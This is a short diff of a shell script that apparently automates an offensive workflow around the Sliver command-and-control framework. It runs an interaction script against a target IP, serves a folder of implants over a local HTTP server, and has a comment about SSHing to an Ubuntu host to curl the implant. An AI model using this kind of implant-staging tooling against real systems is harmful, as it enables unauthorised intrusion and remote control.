@@ -42,8 +42,7 @@ windows_pass=""
 ./SliverInteract.exp $ip_address
 
 # Serve the Files
-cd ~/Desktop/Implants
-qterminal -e bash -c "python -m http.server 8090; exec bash" &
+qterminal -e bash -c "cd ~/Desktop/Implants; python -m http.server 8090; exec bash" &
 
 cd ../
 # SSH -> Curl the Implant (Ubuntu)
